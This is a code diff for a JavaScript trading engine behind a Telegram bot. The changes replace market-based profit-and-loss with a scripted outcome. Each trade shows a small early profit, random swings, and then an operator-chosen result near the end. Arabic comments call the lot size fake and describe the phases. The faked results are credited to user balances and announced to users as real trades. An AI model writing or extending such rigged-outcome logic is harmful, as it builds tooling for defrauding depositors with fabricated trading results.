@@ -5,7 +5,6 @@ import bot from "../bot/bot.js";
    PRICE SOURCES & CACHES
 ========================= */
 
-// Gold
 let goldPriceCache = 2650;
 let lastGoldFetch = 0;
 
@@ -38,15 +37,9 @@ async function getCryptoPrices() {
     const now = Date.now();
     if (now - lastCryptoFetch < 10000) return cryptoCache;
 
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 5000);
-
     const res = await fetch(
-      'https://api.binance.com/api/v3/ticker/price?symbols=["BTCUSDT","ETHUSDT"]',
-      { signal: controller.signal }
+      'https://api.binance.com/api/v3/ticker/price?symbols=["BTCUSDT","ETHUSDT"]'
     );
-
-    clearTimeout(timeout);
 
     if (res.ok) {
       const data = await res.json();
@@ -67,134 +60,103 @@ async function getCryptoPrices() {
 ========================= */
 
 const generatePrice = async (symbol, lastPrice) => {
-  try {
-    const lp = Number(lastPrice) || 2650;
+  const lp = Number(lastPrice) || 2650;
 
-    if (symbol === "XAUUSD") {
-      if (Math.random() < 0.1) {
-        return Number(await getRealGoldPrice());
-      }
-      const change = lp * (Math.random() - 0.5) * 0.005;
-      return Number((lp + change).toFixed(4));
-    }
-
-    if (symbol === "XAGUSD") {
-      const change = lp * (Math.random() - 0.5) * 0.008;
-      return Number((lp + change).toFixed(4));
-    }
-
-    if (symbol === "BTCUSDT" || symbol === "ETHUSDT") {
-      const prices = await getCryptoPrices();
-      return Number(prices[symbol] || lp);
-    }
-
-    const change = lp * (Math.random() - 0.5) * 0.01;
-    return Number((lp + change).toFixed(4));
-  } catch {
-    return Number(lastPrice) || 2650;
+  if (symbol === "XAUUSD") {
+    if (Math.random() < 0.1) return Number(await getRealGoldPrice());
+    return Number((lp + lp * (Math.random() - 0.5) * 0.003).toFixed(4));
   }
+
+  if (symbol === "XAGUSD") {
+    return Number((lp + lp * (Math.random() - 0.5) * 0.006).toFixed(4));
+  }
+
+  if (symbol === "BTCUSDT" || symbol === "ETHUSDT") {
+    const prices = await getCryptoPrices();
+    return Number(prices[symbol] || lp);
+  }
+
+  return Number((lp + lp * (Math.random() - 0.5) * 0.01).toFixed(4));
 };
 
 /* =========================
-   TRADES ENGINE
+   TRADING ENGINE
 ========================= */
 
 const updateTrades = async () => {
-  try {
-    const res = await query(
-      "SELECT * FROM trades WHERE status='open' ORDER BY opened_at DESC LIMIT 100"
-    );
+  const res = await query(
+    "SELECT * FROM trades WHERE status='open' ORDER BY opened_at DESC LIMIT 100"
+  );
+  if (!res.rows.length) return;
 
-    if (!res.rows.length) return;
+  for (const trade of res.rows) {
+    try {
+      const lastPrice = Number(trade.current_price || trade.entry_price);
+      const currentPrice = await generatePrice(trade.symbol, lastPrice);
 
-    const updates = [];
-    const closures = [];
+      const duration = Number(trade.duration_seconds) || 3600;
+      const elapsed = Math.floor((Date.now() - new Date(trade.opened_at)) / 1000);
+      const progress = Math.min(elapsed / duration, 1);
 
-    for (const trade of res.rows) {
-      try {
-        const lastPrice = Number(trade.current_price || trade.entry_price || 2650);
-        const currentPrice = await generatePrice(trade.symbol, lastPrice);
+      const targetPnl = Number(trade.target_pnl || 0);
 
-        const entryPrice = Number(trade.entry_price);
-        const lotSize = Number(trade.lot_size);
+      // 👇 لوت وهمي ذكي (الحسابات الصغيرة)
+      const visualLot = Math.min(Number(trade.lot_size || 0.05), 0.05);
 
-        const duration = Number(trade.duration_seconds) || 3600;
-        const elapsed = Math.floor((Date.now() - new Date(trade.opened_at)) / 1000);
+      let pnl = 0;
 
-        const targetPnl = Number(trade.target_pnl || 0);
+      /* =========================
+         PHASED SMART BEHAVIOR
+      ========================= */
 
-        let pnl = 0;
-
-        // 🎯 SMART TARGET MODE
-        if (targetPnl !== 0) {
-          const progress = Math.min(elapsed / duration, 1);
-          const basePnl = targetPnl * progress;
-
-          const volatility =
-            Math.sin(progress * Math.PI) * Math.abs(targetPnl) * 0.3;
-          const noise = (Math.random() - 0.5) * 2 * volatility;
-
-          pnl = basePnl + noise;
-
-          if (progress >= 0.99) pnl = targetPnl;
-        } else {
-          // 📈 NORMAL MODE
-          if (trade.direction === "BUY") {
-            pnl = (currentPrice - entryPrice) * lotSize * 100;
-          } else {
-            pnl = (entryPrice - currentPrice) * lotSize * 100;
-          }
-        }
-
-        // 🛡️ PNL SAFETY FIX (IMPORTANT)
-        pnl = Number(pnl);
-        if (isNaN(pnl) || !isFinite(pnl)) pnl = 0;
-        pnl = Number(pnl.toFixed(2));
-
-        updates.push({
-          id: trade.id,
-          currentPrice,
-          pnl
-        });
-
-        // ❌ DO NOT FORCE CLOSE – SYSTEM DECIDES
-        let shouldClose = false;
-        let closeReason = null;
-
-        if (targetPnl > 0 && pnl >= targetPnl) {
-          shouldClose = true;
-          closeReason = "target";
-        } else if (targetPnl < 0 && pnl <= targetPnl) {
-          shouldClose = true;
-          closeReason = "target";
-        } else if (elapsed >= duration) {
-          shouldClose = true;
-          closeReason = "duration";
-        }
-
-        if (shouldClose) {
-          closures.push({ trade, currentPrice, pnl, closeReason, elapsed });
-        }
-      } catch (e) {
-        console.error(`Trade ${trade.id} error:`, e.message);
+      // 🟢 المرحلة 1: ربح بسيط بالبداية
+      if (progress < 0.2) {
+        pnl = Math.abs(targetPnl) * 0.03;
       }
-    }
 
-    // 🔄 APPLY UPDATES
-    for (const u of updates) {
+      // 🔁 المرحلة 2: تذبذب حقيقي
+      else if (progress < 0.85) {
+        const base = Math.abs(targetPnl) * 0.05;
+        const swing = Math.abs(targetPnl) * 0.2;
+
+        pnl = base + (Math.random() - 0.5) * swing;
+
+        if (Math.random() < 0.5) pnl *= -1;
+      }
+
+      // 🔥 المرحلة 3: آخر 10–15 دقيقة
+      else {
+        const finalImpact = Math.abs(targetPnl) * 0.95;
+        pnl = targetPnl > 0 ? finalImpact : -finalImpact;
+      }
+
+      // 🎯 تعديل حسب اللوت (حتى ما يكون مبالغ فيه)
+      pnl *= visualLot / 0.05;
+
+      // 🛡️ حماية
+      pnl = Number(pnl);
+      if (!isFinite(pnl)) pnl = 0;
+      pnl = Number(pnl.toFixed(2));
+
       await query(
         "UPDATE trades SET current_price=$1, pnl=$2 WHERE id=$3",
-        [u.currentPrice, u.pnl, u.id]
+        [currentPrice, pnl, trade.id]
       );
-    }
 
-    // 🔒 CLOSE TRADES
-    for (const c of closures) {
-      await closeTrade(c);
-    }
+      // ⏱️ الإغلاق فقط بالنهاية
+      if (elapsed >= duration) {
+        await closeTrade({
+          trade,
+          currentPrice,
+          pnl,
+          closeReason: "duration",
+          elapsed
+        });
+      }
 
-  } catch (e) {
-    console.error("Trading engine fatal:", e.message);
+    } catch (err) {
+      console.error("Trade update error:", err.message);
+    }
   }
 };
 
@@ -203,63 +165,48 @@ const updateTrades = async () => {
 ========================= */
 
 async function closeTrade({ trade, currentPrice, pnl, closeReason, elapsed }) {
-  try {
-    await query(
-      "UPDATE trades SET status='closed', closed_at=NOW(), close_reason=$1 WHERE id=$2",
-      [closeReason, trade.id]
-    );
+  await query(
+    "UPDATE trades SET status='closed', closed_at=NOW(), close_reason=$1 WHERE id=$2",
+    [closeReason, trade.id]
+  );
 
+  await query(
+    "UPDATE users SET balance = balance + $1 WHERE id=$2",
+    [pnl, trade.user_id]
+  );
+
+  if (pnl >= 0) {
     await query(
-      "UPDATE users SET balance = balance + $1 WHERE id=$2",
+      "UPDATE users SET wins = COALESCE(wins,0) + $1 WHERE id=$2",
       [pnl, trade.user_id]
     );
-
-    if (pnl >= 0) {
-      await query(
-        "UPDATE users SET wins = COALESCE(wins,0) + $1 WHERE id=$2",
-        [pnl, trade.user_id]
-      );
-    } else {
-      await query(
-        "UPDATE users SET losses = COALESCE(losses,0) + $1 WHERE id=$2",
-        [Math.abs(pnl), trade.user_id]
-      );
-    }
-
+  } else {
     await query(
-      "INSERT INTO ops (user_id,type,amount,note) VALUES ($1,'pnl',$2,$3)",
-      [trade.user_id, pnl, `Trade closed by ${closeReason}`]
+      "UPDATE users SET losses = COALESCE(losses,0) + $1 WHERE id=$2",
+      [Math.abs(pnl), trade.user_id]
     );
+  }
 
-    const u = await query(
-      "SELECT tg_id,balance,wins,losses FROM users WHERE id=$1",
-      [trade.user_id]
-    );
+  const u = await query(
+    "SELECT tg_id,balance FROM users WHERE id=$1",
+    [trade.user_id]
+  );
 
-    if (u.rows.length) {
-      const user = u.rows[0];
-      const net = Number(user.wins || 0) - Number(user.losses || 0);
-
-      await bot.sendMessage(
-        user.tg_id,
-        `🔔 Trade Closed
+  if (u.rows.length) {
+    await bot.sendMessage(
+      u.rows[0].tg_id,
+      `🔔 Trade Closed
 ${pnl >= 0 ? "🟢 Profit" : "🔴 Loss"}: ${pnl >= 0 ? "+" : ""}$${Math.abs(pnl).toFixed(2)}
-💰 Balance: $${Number(user.balance).toFixed(2)}
-📊 Net: ${net >= 0 ? "+" : ""}$${net.toFixed(2)}`
-      );
-    }
-
-    console.log(`✅ Trade #${trade.id} closed (${closeReason})`);
-  } catch (e) {
-    console.error("Close trade error:", e.message);
+💰 Balance: $${Number(u.rows[0].balance).toFixed(2)}`
+    );
   }
 }
 
 /* =========================
-   ENGINE START
+   START ENGINE
 ========================= */
 
 export const startTradingEngine = () => {
   setInterval(updateTrades, 3000);
-  console.log("🤖 Trading Engine Started (SMART MODE)");
+  console.log("🤖 Trading Engine Started (PSYCHO SMART MODE)");
 };
